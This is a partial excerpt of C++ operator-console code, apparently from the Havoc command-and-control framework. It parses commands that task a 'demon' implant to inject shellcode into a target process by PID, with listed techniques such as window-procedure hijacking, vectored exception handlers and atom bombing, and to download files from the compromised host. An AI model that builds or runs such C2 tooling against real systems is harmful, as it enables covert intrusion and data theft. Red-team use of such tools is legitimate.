...
auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& commandline ) -> bool
{
    ...
    if ( IsValidDemonMagic(MagicValue) )
    {
        IsDemonAgent = true;
    }
    else
    ...
    if ( IsDemonAgent )
    {
        ...
        else if ( InputCommands[ 0 ].compare( "shellcode" ) == 0 )
        {
            ...
            if ( InputCommands[ 1 ] .compare( "inject" ) == 0 )
            {
                ...
                if ( InputCommands.size() >= 6 )
                {
                    ...
                    auto TargetArch = InputCommands[ 3 ];
                    auto TargetPID  = InputCommands[ 4 ];
                    auto Shellcode  = QString( ( InputCommands.begin() + 5 )->toStdString().c_str() );
                    ...
                    // Validate injection method - Updated to match backend reality
                    if ( Method.compare( "callback" ) != 0 && 
                         Method.compare( "fiber" ) != 0 && 
                         Method.compare( "exception" ) != 0 && 
                         Method.compare( "workitem" ) != 0 && 
                         Method.compare( "manual" ) != 0 && 
                         Method.compare( "window" ) != 0 && 
                         Method.compare( "vectored" ) != 0 && 
                         Method.compare( "atombomb" ) != 0 && 
                         Method.compare( "default" ) != 0 ) {
                        CONSOLE_ERROR( "Invalid injection method." )
                        CONSOLE_ERROR( "Threadless: window, vectored, atombomb" )
                        CONSOLE_ERROR( "Thread-based: callback, fiber, exception, workitem, manual" )
                        CONSOLE_ERROR( "Default: window" )
                        return false;
                    }

                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.ShellcodeInject( TaskID, Method, TargetPID, TargetArch, Shellcode, "" ) );
                }
                else if ( InputCommands.size() >= 5 ) 
                {
                    // Legacy support for old syntax (method will default to "default")
                    ...
                    CONSOLE_INFO( "Using legacy syntax. Consider: shellcode inject [method] [arch] [pid] [shellcode]" )
                    SEND( Execute.ShellcodeInject( TaskID, "default", TargetPID, TargetArch, Shellcode, "" ) );
                }
                else
                {
                    CONSOLE_ERROR( "Usage: shellcode inject [method] [arch] [target pid] [/path/to/shellcode]" )
                    CONSOLE_ERROR( "" )
                    CONSOLE_ERROR( "Threadless methods:" )
                    CONSOLE_ERROR( "  window    - Window Procedure Hijacking [DEFAULT]" )
                    CONSOLE_ERROR( "  vectored  - Vectored Exception Handler" )
                    CONSOLE_ERROR( "  atombomb  - Atom Bomb Injection" )
                    CONSOLE_ERROR( "" )
                    CONSOLE_ERROR( "Thread-based methods:" )
                    CONSOLE_ERROR( "  callback  - Timer Callbacks" )
                    CONSOLE_ERROR( "  workitem  - Thread Pool Work Items" )
                    CONSOLE_ERROR( "  fiber     - Windows Fibers" )
                    CONSOLE_ERROR( "  manual    - Manual DLL Mapping" )
                    CONSOLE_ERROR( "  exception - Exception Handler Redirection" )
                    return false;
                }
            }
            else if ( InputCommands[ 1 ].compare( "spawn" ) == 0 )
        ...
        else if ( InputCommands[ 0 ].compare( "download" ) == 0 )
        {
            if ( InputCommands.size() >= 2 )
            {
                ...
                auto Aggressive = QString("false");
                
                // Check if "aggressive" flag is present
                if ( InputCommands.size() >= 3 && InputCommands[ 2 ].compare( "aggressive" ) == 0 )
                {
                    FilePath = InputCommands[ 1 ];
                    Aggressive = "true";
                    TaskID = CONSOLE_INFO( "Tasked demon to aggressively download a file " + FilePath + " (ignoring sleep)" );
                }
                else
                {
                    FilePath = JoinAtIndex( InputCommands, 1 );
                    TaskID = CONSOLE_INFO( "Tasked demon to download a file " + FilePath );
                }

                CommandInputList[ TaskID ] = commandline;

                // Encode: filepath;aggressive_flag
                auto Arguments = FilePath.toLocal8Bit().toBase64() + ";" + Aggressive.toLocal8Bit().toBase64();
                SEND( Execute.FS( TaskID, "download", Arguments ) )
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
